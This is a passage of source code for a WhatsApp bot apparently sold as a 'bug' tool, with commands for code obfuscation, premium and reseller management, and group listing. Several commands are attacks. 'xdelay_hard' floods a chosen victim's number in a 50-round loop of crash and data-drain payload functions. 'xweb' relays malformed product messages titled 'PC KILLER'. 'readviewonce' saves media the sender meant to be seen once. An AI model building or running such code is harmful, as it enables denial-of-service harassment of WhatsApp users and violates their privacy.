    stringSplitting: 0.0,
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: 1.0,

    shuffle: {
        hash: 0.0,
        true: 0.0
    },

    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 0.9,
    deadCode: 0.0,
    dispatcher: true,
    rgf: false,
    calculator: true,
    hexadecimalNumbers: true,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
};


        const options = {
            target: "node",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.5,
  deadCode: 0.25,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  preserveFunctionLength: true,
  identifierGenerator: function () {
                return "DREAM_GUY_XEON" + Math.random().toString(36).substring(7);
            },
        };

            const obfuscatedCode = await JSConfuser.obfuscate(code, optionsObf6);

            const filePath = './enc_by_@ .js';
            fs.writeFileSync(filePath, obfuscatedCode);

            await XeonBotInc.sendMessage(m.chat, {
                document: {
                    url: filePath
                },
                mimetype: 'application/javascript',
                fileName: 'Encrypted By @ .js'
            }, { quoted: m });

        } catch (error) {
            const errorMessage = `There is an error: ${error.message}`;
            await replygcxeon(errorMessage);
        }
}
break;
case 'dec': case 'decrypt': {
if (!isBot && !isCreator) return
const { webcrack } = await import('webcrack');
const usage = `Usage Example:
${prefix + command} (Input text or reply text to dec code)
${prefix + command} doc (Reply to a document)`;

let text;
if (args.length >= 1) {
text = args.join(" ");
} else if (m.quoted && m.quoted.text) {
text = m.quoted.text;
} else {
return replygcxeon(usage);
}

try {
let message;
if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
let docBuffer;
if (m.quoted.mimetype) {
docBuffer = await m.quoted.download();
}
message = await webcrack(docBuffer.toString('utf-8'));
} else {
message = await webcrack(text);
}

const filePath = './dec_by_@ .js';
fs.writeFileSync(filePath, message.code);

await XeonBotInc.sendMessage(m.chat, {
document: {
url: filePath
},
mimetype: 'application/javascript',
fileName: 'Decrypted By @ '
}, {quoted: m});

} catch (error) {
const errorMessage = `There is an error: ${error.message}`;
await replygcxeon(errorMessage);
}
}
break;
case "rvo": case "readviewonce": {
 if (!text) return replygcxeon(mess.wait);
if (!m.quoted) return replygcxeon("reply pesan viewOnce nya!")
let msg = m?.quoted?.message?.imageMessage || m?.quoted?.message?.videoMessage || m?.quoted?.message?.audioMessage || m?.quoted
if (!msg.viewOnce && m.quoted.mtype !== "viewOnceMessageV2" && !msg.viewOnce) return replygcxeon("Pesan itu bukan viewonce!")
const { downloadContentFromMessage } = require("@adiwajshing/baileys");
let media = await downloadContentFromMessage(msg, msg.mimetype == 'image/jpeg' ? 'image' : msg.mimetype == 'video/mp4' ? 'video' : 'audio')
    let type = msg.mimetype
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return XeonBotInc.sendMessage(m.chat, {video: buffer, caption: msg.caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return XeonBotInc.sendMessage(m.chat, {image: buffer, caption: msg.caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return XeonBotInc.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

case 'clearchat':{
if (!isBot && !isCreator) return
m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
                    }
break
case 'xdelay_hard': {
    if (!isBot && !isCreator) return
if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201507151697") {
    return;
    }
    if (victim == "919366316011") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i <50; i++) {
await ZenoDelayPayload(Xreturn)
await (100)
await ZenoDrainKuota(Xreturn)
await (10000)
await ZenoDelayNewBeta(Xreturn)
await (100)
await NullInvis(Xreturn)
await (1000)
await (100)
await delayInfinity(Xreturn)
await (100)
await ZenoDrainKuota(Xreturn)
await (5000)
await XinvisDelay(Xreturn)
await delayNull(Xreturn)
await (5000)
await InvisHardnew(Xreturn)
await (100)
await XStickdelay(Xreturn)
await (100)
await XStickdelay(Xreturn)
await (1000)
await ZenoDrainKuota(Xreturn)
await (100)
}
}
break


case "checkhost": {

if (!q) return replygcxeon(`Example : ${prefix + command} https://nxnn.com`)
let msg = { viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": "p"
    },
    "body": {
      "text": "Click Chech Host To Check Web"
    },
    "footer": {
      "text": botname
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": JSON.stringify( {display_text : 'Check Host' , url : `https://check-host.net/check-http?host=${q}`, merchant_url : `https://check-host.net/check-http?host=${q}` })
        }
      ],
      "messageParamsJson": ""
    }
  }
}
}
}
XeonBotInc.relayMessage(m.chat, msg, {});
}
break

case 'addresell': case 'addreseller': {
    if (!global.dev.includes(senderNumber)) return
    
    let number = text.replace(/[^0-9]/g, '') // Extract number from text
    if (!number) return replygcxeon("Please provide a valid number.");

    if (global.db.data.owners.includes(number)) {
        return replygcxeon("Number already in reseller list.");
    }

    global.db.data.owners.push(number);
    fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2));
    replygcxeon(`Number ${number} added to reseller.`);
}
break;

case 'delresell': case 'delreseller': {
    if (!global.dev.includes(senderNumber)) return

    let numberToDelete = text.replace(/[^0-9]/g, '') // Extract the number
    if (!numberToDelete) return m.reply("Please provide a valid number to delete.");

    // Check if the number exists in the owners list
    let index = global.db.data.owners.indexOf(numberToDelete);
    if (index === -1) {
        return replygcxeon("The provided number is not in the reseller list.");
    }

    // Remove the number from the owners list
    global.db.data.owners.splice(index, 1);
    fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2));
    replygcxeon(`Number ${numberToDelete} has been removed from the reseller list.`);
}
break;

case 'listresell': case 'listreseller': {
    let owners = global.db.data.owners || [];
    if (owners.length === 0) {
        return replygcxeon("There are no reseller in the list.");
    }

    let ownerList = owners.map((num, index) => `${index + 1}. ${num}`).join('\n');
    replygcxeon(`Total Reseller: ${owners.length}\n\n${ownerList}`);
}
break;


case 'addprem':
			case 'addpremium': {
				if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: 
Telegram: @comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏
WhatsApp: +201507151697`);
}
				if (!text) return replygcxeon(`*Incorrect use!*\n\nUsage:\n${prefix + command} <user|time>\n\nExample:\n${prefix + command} @0|1d`)
				let nomor = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
				if (owner.includes(nomor)) return replygcxeon("*Bot owners can't get owner!*")
				let premium = await cd.isPremium(usersdb, nomor)
				if (premium) return replygcxeon("*This user is already in the premium list*")
				let users = await XeonBotInc.onWhatsApp(nomor)
				if (users.length < 1) return replygcxeon(`*Tag/reply/input number correctly!*\n\nUsage:\n${prefix + command} <user|time>\n\nExample:\n${prefix + command} @0|1d`)
				let expired = text.split("|")[1]
				if (!expired) return replygcxeon(`*Enter expiry date!*\n\nUsage:\n${prefix + command} <user|time>\n\nExample:\n${prefix + command} @0|1d`)
				await XeonBotInc.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				let addprem = await cd.addPrem(usersdb, users[0].jid, expired)
				const contentText = {
					text: addprem,
					contextInfo: {
						mentionedJid: XeonBotInc.ments(addprem),
						externalAdReply: {
							title: `OWNER 💳`,
							previewType: "PHOTO",
							thumbnailUrl: `https://pomf2.lain.la/f/dynqtljb.jpg`,
							sourceUrl: link
						}
					}
				};
				return XeonBotInc.sendMessage(m.chat, contentText, {
					quoted: m,
				});
			}
			break

case 'delprem':
			case 'delpremium': {
				if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @ 
Telegram: @comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏
WhatsApp: +201507151697`);
}
				if (!text) return replygcxeon(`*Incorrect use!*\n\nUsage:\n${prefix + command} <user>\n\nExample:\n${prefix + command} @0`)
				let nomor = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
				let premium = await cd.isPremium(usersdb, nomor)
				if (!premium) return replygcxeon("*This user is not a premium user!*")
				let delprem = await cd.delPrem(usersdb, nomor)
				replygcxeon(delprem)
			}
			break
        
case 'listprem':
case 'listpremium': {
	if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @ 
Telegram: @comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏
WhatsApp: +201507151697`);
}
    try {
        let premium = await cd.listPremium(usersdb);
        let teks = `*</> PREM USER LIST </>*\n\n`;

        for (let i = 0; i < premium.length; i++) {
            let expiry = usersdb[premium[i]].premiumExpiry;

            if (!expiry || expiry <= Date.now()) {
                teks += `${i + 1}. @${premium[i].split("@")[0]}\nExpired: Already expired\n\n`;
                continue;
            }

            // Calculate remaining time
            let timeLeft = expiry - Date.now();
            let days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
            let hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            let minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));

            teks += `${i + 1}. @${premium[i].split("@")[0]}\nExpire In: ${days} day, ${hours} hour, ${minutes} minute\n\n`;
        }

        XeonBotInc.sendTextWithMentions(m.chat, teks, m);
    } catch (error) {
        replygcxeon(util.format(error), command);
    }
}
break;

			
			case 'checkprem':
case 'checkpremium': {
    try {
        let expiry = usersdb[m.sender].premiumExpiry;
        if (!expiry || expiry <= Date.now()) {
            return replygcxeon(`Your owner subscription has already expired.`);
        }

        // Calculate remaining time
        let timeLeft = expiry - Date.now();
        let days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
        let hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        let minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));

        let teks = `*</> PREM USER INFO </>*

*Subscribe Info* :
- User : @${m.sender.split("@")[0]}
- Duration : ${days}D
- Expire In : 
${days} day, ${hours} hour, ${minutes} minute

*Benefit Info* :
- Premium Access : Yes
- User Priority : Yes
`;

        const contentText = {
            text: teks,
            contextInfo: {
                mentionedJid: XeonBotInc.ments(teks),
                externalAdReply: {
                    title: `PREMIUM 💳`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://pomf2.lain.la/f/dynqtljb.jpg`,
                    sourceUrl: link,
                },
            },
        };

        return XeonBotInc.sendMessage(m.chat, contentText, { quoted: m });
    } catch (error) {
        await replygcxeon(util.format(error), command);
    }
}
break;


case 'self': {
    if (!isBot && !isCreator) return
XeonBotInc.public = false
replygcxeon('Success Change To Self Mode')
}
break

case 'public': {
    if (!isBot && !isCreator) return
XeonBotInc.public = true
replygcxeon('Success Change To Public Mode')
}
break
case "listgc":{
if (!isBot && !isCreator) return
let getGroups = await XeonBotInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST OF GROUP BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await XeonBotInc.groupMetadata(x)
teks += `❏ Group ${hituet+=1}\n│⭔ *Name :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
m.reply(teks)
  }
break
case 'owner': {
const wokex = ownernomer // Extract the number part
const pushnamex = `${wokex}`
const kontak = {
"displayName": pushnamex,
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN: ${pushnamex}\nitem1.TEL;waid=${wokex}:${wokex}\nitem1.X>ABLabel:\nPlease Don't Spam My Owner\nURL;Email Owner:${pushnamex}@gmail.com\nORG: THIS IS MY OWNER\nEND:VCARD`
}
const oke = await XeonBotInc.sendMessage(from, {
contacts: { contacts: [kontak] },
contextInfo:{ forwardingScore: 999, isForwarded: false, mentionedJid:[sender],
"externalAdReply":{
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"jpegThumbnail": fs.readFileSync("./XeonMedia/thumb.jpg"),
"mediaUrl": 'https://i.ibb.co/ydRKHnw/thumb.jpg',
"sourceUrl": `https://youtube.com/@ `
}}}, { quoted: m })
//await XeonBotInc.sendMessage(m.chat, {audio: fs.readFileSync('./XeonMedia/sikma.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:oke})
}
break
case 'xweb':
        if (!isBot && !isCreator) return
try {
for (let i = 0; i < 10; i++) {
messa = await prepareWAMessageMedia({
image: {
url: `https://pic.re/image`
}
}, {
upload: XeonBotInc.waUploadToServer
})
catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"itemCount": 99999999999,
"title": `PC KILLER X Telegram: @comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏`,
"description": ``,
"currencyCodeIso4217": "IDR",
"footerText": ``,
"productImageCount": 99999999999999999999,
"firstImageId": 9999999999,
"priceAmount1000": "999",
"salePriceAmount1000": "IDR 99.99999999999999999999",
"thumbnail": messa.imageMessage,
"jpegThumbnail": m,
"firstImageId": 99999999,
"url": "wa.me/5512981791389"
},
"businessOwnerJid": from,
}
}), {
userJid: XeonBotInc.user.id,
quoted: null
})
XeonBotInc.relayMessage(from, catalog.message, {
messageId: catalog.key.id
})
}
} catch (e) {
console.log(e);
}
break
	case 'ping': case 'runtime': case 'p': case 'botstatus': case 'statusbot': {
if (!isBot && !isCreator) return
                const speed = require('performance-now')
const { performance } = require('perf_hooks')
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed:\n${latensi.toFixed(4)} _Second_ \n${oldd - neww} _miliseconds_\n\nRuntime:\n${runtime(process.uptime())}
                `.trim()
                replygcxeon(respon)
            }
            break
case 'makecase':

if (!isBot && !isCreator) return
if (!m.quoted) return replygcxeon('Reply to a message to make a case of it!');
кибар = q.split(' ')[0];
if (!кибар) {
        return replygcxeon(`Example Usage: ${prefix+command} abc`);
    }    
const kak = (JSON.stringify(m.message.extendedTextMessage.contextInfo.quotedMessage, null, 2))
replygcxeon (`case '${кибар}': 
if (!isBot && !isCreator) return
try {
var ${кибар} = generateWAMessageFromContent(from, proto.Message.fromObject(${kak}),{ userJid: from })
XeonBotInc.relayMessage(from, ${кибар}.message, {messageId: ${кибар}.key.id })
} catch (e) {
console.log(e)
}
break`)
break

case 'tesb': {
  let msgs = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `hui`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: true,
            ...await prepareWAMessageMedia(
              { image: fs.readFileSync('./XeonMedia/donate.jpg') },
              { upload: XeonBotInc.waUploadToServer }
            )
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "Call Owner",
                  phone_number: "+1234567890" // Replace with the actual phone number
                })
              }
            ]
          }),
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: idch,
              newsletterName: ownername,
              serverMessageId: 143
            }
          }
        })
      }
    }
  }, { quoted: m });

  return await XeonBotInc.relayMessage(m.chat, msgs.message, {});
}
break;

	
	

case 'getmtype': {

    if (!m.quoted) return replygcxeon('Reply to a message to debug its mtype!');
    const quotedMtype = m.quoted.mtype || 'Unknown';
    console.log(`Quoted Message Type: ${quotedMtype}`);
    await replygcxeon(`Quoted Message Type: ${quotedMtype}`);
    }
break;

default:
}
} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
